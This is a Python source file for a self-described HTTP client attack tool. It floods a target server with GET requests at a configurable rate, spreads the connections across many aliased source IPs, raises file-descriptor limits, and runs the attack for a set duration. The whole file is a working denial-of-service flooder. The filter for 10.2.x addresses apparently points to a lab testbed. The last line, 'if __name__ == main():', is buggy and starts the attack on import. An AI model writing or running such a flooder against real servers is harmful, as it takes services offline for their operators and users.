import threading
import socket
import random
import argparse
import myasyncore
import netifaces
import random
import queue
import resource
import time
import re
from enum import Enum

sys_random = random.SystemRandom()

# from socket.h SO_BINDTODEVICE 25
SO_BINDTODEVICE=25

# Arguments (again, being bad with globals)
parser = argparse.ArgumentParser(description='Asynchronous, single-thread HTTP client attack tool.')
parser.add_argument('--server', '-s', action='store', dest='server', required=True, help='Server to target.')
parser.add_argument('--rate', '-r', action='store', type=int, dest='rate', default=3000, help='Target rate of requests/s to maintain.')
parser.add_argument('--urls', '-u', action='store', dest='url_filename', default='', help='File with urls to pull from. If no file is specified, requests are made to root.')
parser.add_argument('--num_ips', '-n', action='store', type=int, dest='num_ips', default=-1, help='Number of distinct client IPs to use.')
parser.add_argument('--interface', '-i', action="store", dest='device', default='eth', help='Optionally used to specify which device to send requests out of. Eg "eth0". By default, program will find device with most aliases assigned to it and use that device.')
parser.add_argument('--maxopen', '-m', action="store", type=int, dest='max_open', default=1024, help='The absolute max number of connections to have open at any interval check.')
parser.add_argument('--checks', '-c', action='store', dest='checks', type=int, default=10, help="The number of times per second we're guaranteed to check on progress. If there's lots of network activity we check more often.")
parser.add_argument('--timeout', '-t', action='store', dest='timeout', type=int, default=3, help='Time in seconds to timeout connections.')
parser.add_argument('--duration', '-d', action='store', dest='duration', type=int, default=0, help='Duration of attack in seconds. Attack will go for *approximately* this long.')
parser.add_argument('--debug', '-D', action='store_true', help='Print out status messages')

args = parser.parse_args()

class StatType(Enum):
    current=1
    replied=2
    req_sent=3
    connected=4
    closed=5
    started=6
    inactivity=7

class StatsMsg():
    def __init__(self, type=None, value=0, ip=None):
        self.type = type
        self.value = value
        self.ip = ip

class Stats():
    def __init__(self, q=None):
        self.stats = {}
        for type in StatType:
           self.stats[type.name] = 0

    def handle_stats_msg(self, msg):
        try:
            self.stats[msg.type.name] = self.stats[msg.type.name] + msg.value
        except Exception as e:
            print("Problem parsing msg: %s" % e)
            pass
            
    def put(self, msg):
        self.handle_stats_msg(msg)
    
    def zero_stats(self):
        # We zero everything but the number of current connections.
        for stat in self.stats:
            if stat != 'current':
                self.stats[stat] = 0

    def current_conns(self):
        return self.stats['current']
    
    def started_conns(self):
        return self.stats['started']
                                        
    def print_stats(self, now=None):
        if now != None:
            msg="%s\t " % now
        else:
            msg=''
        for stat in sorted(self.stats):
            msg = msg+"%s:\t%d\t "%(stat, self.stats[stat])
        print(msg)

        


class HTTPClient(myasyncore.dispatcher):
    def __init__(self, server, path, stats_handler, ip=None, lastdata=None, timeout=None, debug=False):
        self.debug = debug
        self.stats_handler = stats_handler
        self.ip = ip
        self.received_reply=False
        
        myasyncore.dispatcher.__init__(self, lastdata=lastdata, timeout=timeout)
        self.stats_handler.put(StatsMsg(type=StatType.current, value=1))
        
        try:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, int(args.timeout))
            # This won't buy us anything if we're going to the same server, but might as well throw it in.
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception as e:
            self.my_close(error=True)
            print('Failed to set sockopts:%s' % e)
            return
        
        # If we're given an IP, bind to it.
        if self.ip != None:
            try:
                self.bind((ip, 0))
            except Exception as e:
                self.my_close(error=True)
                print("Failed to bind:%s" % e)
                return
                
        try:
            self.connect((server, 80))
            self.buffer = bytes('GET %s HTTP/1.1\r\nHost: %s\r\n\r\n' % (path, server), 'ascii')
            self.req_size = len(self.buffer)
        except Exception as e:
            print("Failed to connect.")
            return
            
        self.stats_handler.put(StatsMsg(type=StatType.started, value=1))
        
    def handle_connect(self):
        if self.debug:
            self.stats_handler.put(StatsMsg(type=StatType.connected, value=1))
                
    def my_close(self, inactivity_timeout=False, error=False):
        #self.stats_handler.put(StatsMsg(type=StatType.current, value=-1, ip=self.ip))
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
            self.stats_handler.put(StatsMsg(type=StatType.current, value=-1, ip=self.ip))
        except Exception as e:
            pass
        self.close()
    
    def handle_close(self, inactivity_timeout=False):
        if len(self.buffer) > 0 and inactivity_timeout:
            # If we're closing due to inactivity, but it's our side that didn't send out data,
            # put off closing and try getting the request out.
            self.handle_write()
            if len(self.buffer) >=0:
                return
                    
        if self.debug:
            self.stats_handler.put(StatsMsg(type=StatType.closed, value=1))
            if inactivity_timeout:
                self.stats_handler.put(StatsMsg(type=StatType.inactivity, value=1))
            if len(self.buffer):
                print("WARNING: Did not send full request before close!")
            
        self.my_close(inactivity_timeout=inactivity_timeout)
    
    def handle_read(self):
        data = self.recv(8192)
        if not data:
            return 
        if self.received_reply == False:
            self.received_reply = True
            if self.debug:
                self.stats_handler.put(StatsMsg(type=StatType.replied, value=1))
            
    def writable(self):
        if len(self.buffer) > 0:
            self.handle_write()        
        return (len(self.buffer) > 0)
    
    def handle_write(self):
        sent = self.send(bytes(self.buffer))
        if sent >= len(self.buffer) and self.debug:
            self.stats_handler.put(StatsMsg(type=StatType.req_sent, value=1)) 
        self.buffer = bytes(self.buffer[sent:])
        
def get_urls(filename):
    urls = []
    try:
        with open(filename) as f:
            urls = f.readlines()
        urls = [x.split()[0].strip() for x in urls]
    except Exception as e:
        print("Problem with pulling urls from file %s: %s" % (filename, e))
        raise
    return urls
    
def start_conns(goal, q, ips, urls, now=0, current=0):
    global args
    num = min(args.max_open-current-4, goal)
    if num < goal:
        print("Not meeting target of %d new connections. Starting %d. We already have %d open, and a max of %d we can have open." % (goal, num, current, args.max_open))
    for x in range(0, num):
        ip = random.choice(ips)
        if len(urls) > 0:
            path = random.choice(urls) 
        else:
            path = '/'
        start_conn(q, ip, path, now)

def start_conn(q, ip, path, now):
    global args
    client = HTTPClient(args.server, path, q, ip, lastdata=now, timeout=args.timeout, debug=args.debug)

def process_stats_queue(stats, q, urls):
    # Hack to process most of the queue, but not sit here forever as tons of connections
    # generate more stats messages.
    started_conns = 0
    for x in range(0,args.rate*6*2):
        try:
            msg = q.get_nowait()
        except queue.Empty:
             #print("Handled %d messages" % (x))
             return started_conns
        except Exception as e:
            raise e
        stats.handle_stats_msg(msg)
        # We've closed something.
        if msg.value < 0 and msg.ip != None:
            if len(urls) > 0:
                path = random.choice(urls)
            else:
                path = '/'
    print("Handled max limit of messages")
                

def get_ips():
    ips = []

    global args
    all_interfaces = netifaces.interfaces()
    
    # XXX a hack - may not have eth*: in our name, or may not want to use all that do.
    aliases = [i for i in all_interfaces if args.device in i and ':' in i]
    
    # Also a hack - but just a sanity test.
    eth_devices_with_aliases = {l.split(':')[0]: True for l in aliases}
    if len(eth_devices_with_aliases) > 1:
        print("ERROR: There appears to be more than one device with %s and aliases defined. Use '-i' to specifiy which device to use." % (args.device))
        exit()
    elif len(eth_devices_with_aliases) < 1:
        print("ERROR: Could not find a device with %s and aliases assigned. You can try using '-i' to be more specific." % args.device)
    else:
        dev = eth_devices_with_aliases.popitem()[0]
        print("Using %s with %d aliases" % (dev, len(aliases)))
    print("Getting IPs of aliases. This may take a bit.")
    devs = [i for i in all_interfaces if dev in i and ':' in i] 
    for dev in devs:
        for link in netifaces.ifaddresses(dev)[netifaces.AF_INET]:
            if (re.match('^10\.2\.',link['addr'])):
                ips.append(link['addr'])
        if len(ips) >= args.num_ips and args.num_ips > 0:
            break
    print("Have %d IPs to work with." % len(ips))
    return ips
                                    

def main():
    global args
    
    print("Attempting to up open file descriptor limit.")
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (60000, 70000))
        (soft,hard) = resource.getrlimit(resource.RLIMIT_NOFILE)
        print("File descriptor limit is %d. Using this for max open" % soft)
        args.max_open = soft
    except ValueError:
        print("Not able to raise resource limit. Run this script as root!")
        exit()
    except Exception as e:
        print("Unable to set resource limits: %s" % e)
        exit()
    
    stats = Stats()
    
    if args.url_filename != '':
        try:
            urls = get_urls(args.url_filename)
        except:
            exit()
    else:
        urls = []
    
    ips = get_ips()
    
    check_interval = 1/(float(args.checks))

    # Loop
    seconds=0
    last_report = last_time_check = time.time()
    print("Starting attack.")
    start_conns(int(float(args.rate)/float(args.checks)), stats, ips, urls, last_time_check, current=0)
    while True:
        try:
            # Get the number of currently running conns (to hand to start_conns so we stay within max_open)
            c = stats.current_conns()

            # Figure out how long since we last started connections.
            now = time.time()
            time_delta = now - last_time_check
            
            # For stats reporting, try to report roughly every second.
            # We also use this to maintain a duration.
            if args.duration != 0 or args.debug:
                if now - last_report >= 1:
                    last_report = now
                    if args.debug:
                        # print and zero stats.
                        stats.print_stats(now=now)
                        stats.zero_stats()
                    seconds = seconds + 1
                    if seconds >= args.duration and args.duration != 0:
                        # These aren't really seconds, but close enough.
                        print("Reached duration limit of %d" % args.duration)
                        break

            # Calculate the number of conns we need to start for the delta we have.
            if time_delta >=  check_interval:
                last_time_check = now
                delta_starts = int(time_delta * float(args.rate))
                start_conns(delta_starts, stats, ips, urls, now, current=c)

            try:
                # Head back in to epoll
                myasyncore.loop(timeout=check_interval, use_poll=True, now=now, count=None)
            except Exception as e:
                print("Problem with epoll: %s" % e)
                raise

        except (KeyboardInterrupt, SystemExit):
            print("Exiting.")
            break
        except Exception as e:
            print("Encountered exception: '%s'" % e)
            pass
    
if __name__ == main():
    main()

